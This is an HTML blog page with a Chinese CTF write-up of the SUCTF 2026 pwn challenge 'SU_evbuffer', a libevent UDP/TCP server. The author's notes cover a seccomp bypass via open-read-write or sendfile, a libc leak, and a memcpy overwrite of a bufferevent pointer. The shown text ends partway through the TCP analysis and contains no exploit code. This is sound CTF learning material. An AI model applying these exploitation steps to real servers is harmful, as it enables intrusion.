@@ -1,0 +1,1250 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shark">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SU_evbuffer    服务器？？？ 开了8888和8889两个监听端口   socket（2-&gt;ipv4,2-&gt;UDP,0)   UDP监听，8889     TCP监听，8888 tcp由于稳定大多用于核心业务，udp则是发个小数据包看看服务器在不在之类的 总之udp要的是快，tcp要稳（我在说什么废话） 无论数据从哪个端口进入，最终都会汇聚到 sub_13A4 函数进行处理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUCTF 2026">
+<meta property="og:url" content="https://ghostshark-pro.github.io/2026/04/23/SUCTF%202026/index.html">
+<meta property="og:site_name" content="shark&#39;s home">
+<meta property="og:description" content="SU_evbuffer    服务器？？？ 开了8888和8889两个监听端口   socket（2-&gt;ipv4,2-&gt;UDP,0)   UDP监听，8889     TCP监听，8888 tcp由于稳定大多用于核心业务，udp则是发个小数据包看看服务器在不在之类的 总之udp要的是快，tcp要稳（我在说什么废话） 无论数据从哪个端口进入，最终都会汇聚到 sub_13A4 函数进行处理">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773452883027-bcb01524-b7f5-4dd8-83d4-4285fe2d22f4.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773452903356-95788d2e-0b24-4d4a-b189-7b98e5f22a69.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773455594021-697e861e-d1c8-408f-adba-ff310f3bab6a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773456029843-661aceee-e27c-4762-aee1-7bdbe9fb5076.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773455639836-c40d0638-e6e4-447e-adf8-fd335caea360.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773456070403-1dab2631-3d3e-4d04-8628-f2fbb5ebccb4.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773457578971-215afa3e-12ad-46ed-8354-000550d71efe.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773457734561-fe3dc0c1-2732-4613-bee4-0c9100718c51.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773457925821-3ca00494-213b-4dbb-b69d-5f967a6f47cf.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773458937962-69fa0ca0-58f2-41f5-ac83-afb76c93adb5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773462056250-9ca27730-25a4-4795-b510-c475a02563a2.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773462804494-277b31b4-55e6-45f1-b941-51f7d5aba1f3.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773462934146-cf86812c-5e7f-4e79-8bc9-67d8331502b7.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773467794052-684d0bfb-1262-4051-a59f-f8565666de3e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773475734214-dcddd471-f3a8-441d-baa0-dd021a7056ac.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773475755166-b0e3de2e-0cc7-4f2e-a758-d182e78d7c84.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773475778678-c13c0721-7339-46a5-97a5-5a0c388c6983.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773475938811-f24a5b3d-faca-4d92-bfd2-733352c46a07.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773475958822-b2b6025a-ce10-4048-a51f-e116bc6f0910.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773476113362-495dfd98-231e-4fb3-86af-44d0996875ec.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773554983989-95b08103-2223-41a2-9ad8-c75424524856.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773559198134-f9883081-627d-4e9e-ad8c-b14115dc2930.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773570347578-39f15634-e277-4829-9bb1-3e143361556c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773569926058-6e4f0eef-ce65-4b1c-9ae7-3cbdee185503.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773569963839-aabee77a-e74b-447a-a7de-b3b5dd5dd1d7.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773571950785-03aae0bc-0e8f-403e-a94a-73eaad16961d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773572027575-1dd3c0ca-1a05-4cdc-bf30-5fc07ffcb9ec.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773575321795-41188374-da28-4086-a5f3-4bb52e086ed3.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773575642284-f94ae803-bbc4-4238-927b-1bdf43dfa248.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773579824864-8533c737-ebf7-44cd-bbb6-783b82bd0b1c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773579856979-155c7355-18fa-4e06-b835-40d8f3a0963f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773579882865-dd0b9862-3cb1-4145-9d7f-b7e38d9672a5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773580078300-c6718dce-aedc-4ea4-9127-4479bc691464.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773580193867-4374b3b2-d771-446c-a775-7e05a1e16aba.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773581421440-61b826b1-43f7-42c7-b6de-ce7aa77a56f5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773581767039-522c2634-1ece-4334-b9c0-b07e1f24b679.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773753624873-5b8afcf3-12be-4fd3-b778-83a271088596.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773754817668-6fe97104-6b28-4552-8437-175f87380edd.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773756388468-95961bc4-f9fd-4d89-b8e5-27ab0f2ba93d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773817207978-6a5f56ec-7e20-4a7a-8041-bdb5c8c2b8fd.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773821880343-c3ce2630-c060-4452-9855-b7f527648949.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773822145465-0e4affef-aa35-4aea-bcbe-97f06e62a18f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773822544914-2a82b04b-7594-4f88-9f73-167db89c815e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773823847627-2396ef08-ff3e-496e-a9d1-10006b18f485.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773823197191-be6031c2-f50b-464f-bbdd-8769108e399a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773824373763-805d1680-935e-4594-8298-bc8b4d6759ee.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773825362986-cecbca8c-3434-4376-b82f-f0f09aed50e3.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773825395021-29c14413-68c1-4629-a648-dbc4a48dcaa8.jpeg">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773826636992-0cb35d2e-cc07-4c03-b56e-3b6cbcf067c2.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773827086438-24dc978a-743b-45af-be6c-95c351abff16.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773827134050-20a9cba9-1cef-4dec-8615-d87484152e4f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773827161404-f0120a27-0a5c-4b82-b556-db73b01330ab.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773827190355-b9b20e2e-fb2b-4277-b84e-4e5802ca5ce5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773827336516-baf1289c-f5f9-4e03-8ae9-9a67dc8690fe.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773827363968-e63cf7ee-1c2c-4062-b7db-b5b2850cc168.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773841267428-3fefdfd8-840a-4f59-bbe2-3f0d22331ac6.png">
+<meta property="article:published_time" content="2026-04-23T12:57:31.000Z">
+<meta property="article:modified_time" content="2026-04-23T13:25:39.196Z">
+<meta property="article:author" content="shark">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ghostshark-pro.github.io/images/SUCTF-2026/1773452883027-bcb01524-b7f5-4dd8-83d4-4285fe2d22f4.png">
+  
+  
+  
+  <title>SUCTF 2026 - shark&#39;s home</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ghostshark-pro.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#00FFFF","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>shark&#39;s home</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Terminal</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Arsenal</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Timeline</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Friends</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>Whoami</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>Terminal</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>Arsenal</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>Tags</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>Timeline</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/links/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-link-fill"></i>
+                  <span>Friends</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>Whoami</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>Grep</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="Light Mode"
+               data-label-dark="Dark Mode">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">Dark Mode</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SUCTF 2026"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-23 20:57" pubdate>
+          2026年4月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.6k bytes
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          ETA: 72 min
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SUCTF 2026</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="SU-evbuffer"><a href="#SU-evbuffer" class="headerlink" title="SU_evbuffer"></a>SU_evbuffer</h1><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773452883027-bcb01524-b7f5-4dd8-83d4-4285fe2d22f4.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773452903356-95788d2e-0b24-4d4a-b189-7b98e5f22a69.png" srcset="/img/loading.gif" lazyload></p>
+<p>服务器？？？</p>
+<p>开了8888和8889两个监听端口</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773455594021-697e861e-d1c8-408f-adba-ff310f3bab6a.png" srcset="/img/loading.gif" lazyload></p>
+<p>socket（2-&gt;ipv4,2-&gt;UDP,0)</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773456029843-661aceee-e27c-4762-aee1-7bdbe9fb5076.png" srcset="/img/loading.gif" lazyload></p>
+<p>UDP监听，8889</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773455639836-c40d0638-e6e4-447e-adf8-fd335caea360.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773456070403-1dab2631-3d3e-4d04-8628-f2fbb5ebccb4.png" srcset="/img/loading.gif" lazyload></p>
+<p>TCP监听，8888</p>
+<p>tcp由于稳定大多用于核心业务，udp则是发个小数据包看看服务器在不在之类的</p>
+<p>总之udp要的是快，tcp要稳（我在说什么废话）</p>
+<p>无论数据从哪个端口进入，最终都会汇聚到 <code>sub_13A4</code> 函数进行处理  </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773457578971-215afa3e-12ad-46ed-8354-000550d71efe.png" srcset="/img/loading.gif" lazyload></p>
+<p>sub_12E5开了个seccomp</p>
+<p>ban了59和322系统调用</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773457734561-fe3dc0c1-2732-4613-bee4-0c9100718c51.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773457925821-3ca00494-213b-4dbb-b69d-5f967a6f47cf.png" srcset="/img/loading.gif" lazyload></p>
+<p>exe是不行了，但是可以orw或者mprotect，sendfile</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773458937962-69fa0ca0-58f2-41f5-ac83-afb76c93adb5.png" srcset="/img/loading.gif" lazyload></p>
+<p>回调函数sub_1630</p>
+<p>我们先看看UDP的callback function</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773462056250-9ca27730-25a4-4795-b510-c475a02563a2.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看sub_1344</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773462804494-277b31b4-55e6-45f1-b941-51f7d5aba1f3.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看sub_1318</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773462934146-cf86812c-5e7f-4e79-8bc9-67d8331502b7.png" srcset="/img/loading.gif" lazyload></p>
+<p>free(ptr)</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773467794052-684d0bfb-1262-4051-a59f-f8565666de3e.png" srcset="/img/loading.gif" lazyload></p>
+<p>malloc(0x50)</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773475734214-dcddd471-f3a8-441d-baa0-dd021a7056ac.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773475755166-b0e3de2e-0cc7-4f2e-a758-d182e78d7c84.png" srcset="/img/loading.gif" lazyload></p>
+<p>leak一下</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773475778678-c13c0721-7339-46a5-97a5-5a0c388c6983.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773475938811-f24a5b3d-faca-4d92-bfd2-733352c46a07.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773475958822-b2b6025a-ce10-4048-a51f-e116bc6f0910.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773476113362-495dfd98-231e-4fb3-86af-44d0996875ec.png" srcset="/img/loading.gif" lazyload></p>
+<p>get libc_base</p>
+<p>刚才的不行，我们改一下主机名再看看其它leak的指针</p>
+<p>不太得劲，我得换个想法</p>
+<p>Obviously, the challenge is fixed with utilization of heap and web server </p>
+<p>we also need to learn the structure of libevent</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773554983989-95b08103-2223-41a2-9ad8-c75424524856.png" srcset="/img/loading.gif" lazyload></p>
+<p>In remote, the hostname is ‘pwn’</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773559198134-f9883081-627d-4e9e-ad8c-b14115dc2930.png" srcset="/img/loading.gif" lazyload></p>
+<p>难道这leak的addr是完全随机的？？？</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773570347578-39f15634-e277-4829-9bb1-3e143361556c.png" srcset="/img/loading.gif" lazyload></p>
+<p>s只有0x70</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773569926058-6e4f0eef-ce65-4b1c-9ae7-3cbdee185503.png" srcset="/img/loading.gif" lazyload></p>
+<p>UDP的回调函数</p>
+<table>
+<thead>
+<tr>
+<th><strong><font style="color:rgb(31, 31, 31);">sub_1630 参数</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">来源 (从 event_new 传入)</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">具体含义</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;fd&lt;/font&gt;**</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;fd&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">触发事件的文件描述符（即 8889 端口的 UDP Socket）。</font></td>
+</tr>
+<tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;a2&lt;/font&gt;**</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;18LL&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);"> (0x12)</font></td>
+<td><strong><font style="color:rgb(31, 31, 31);">触发的事件类型</font></strong><font style="color:rgb(31, 31, 31);">。</font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;18&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);"> 是 </font>&#96;<font style="color:rgb(68, 71, 70);">EV_READ (0x02)</td>
+</tr>
+<tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;dest_1&lt;/font&gt;**</code></td>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;&amp;s_&lt;/font&gt;**</code></td>
+<td><strong><font style="color:rgb(31, 31, 31);">用户自定义参数</font></strong><font style="color:rgb(31, 31, 31);">。在 </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;main&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);"> 中传入的是全局变量 </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;s_&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);"> 的地址。</font></td>
+</tr>
+</tbody></table>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773569963839-aabee77a-e74b-447a-a7de-b3b5dd5dd1d7.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以接收0x3ff&#x3D;1023到buf,但buf有1032字节，没有overflow</p>
+<p>addr_len &#x3D; 16是地址长度，ipv4正好是16</p>
+<p>看看sub_13a4</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773571950785-03aae0bc-0e8f-403e-a94a-73eaad16961d.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773572027575-1dd3c0ca-1a05-4cdc-bf30-5fc07ffcb9ec.png" srcset="/img/loading.gif" lazyload></p>
+<p>dest -&gt;s</p>
+<p>s &#x3D; 0x70</p>
+<p>n_max &#x3D; 1023</p>
+<p>也就是说，我们可以覆盖s开始的1023数据</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773575321795-41188374-da28-4086-a5f3-4bb52e086ed3.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li><code>**dest + 32**</code>：对应结构体中的某个标志位。</li>
+<li><code>**dest + 40**</code>：对应一个 <code>bufferevent</code> 指针</li>
+</ul>
+<p>可以通过memcpy set dest+32 &#x3D;&#x3D;1 and dest+40-&gt; pointer</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773575642284-f94ae803-bbc4-4238-927b-1bdf43dfa248.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看tcp</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773579824864-8533c737-ebf7-44cd-bbb6-783b82bd0b1c.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773579856979-155c7355-18fa-4e06-b835-40d8f3a0963f.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773579882865-dd0b9862-3cb1-4145-9d7f-b7e38d9672a5.png" srcset="/img/loading.gif" lazyload></p>
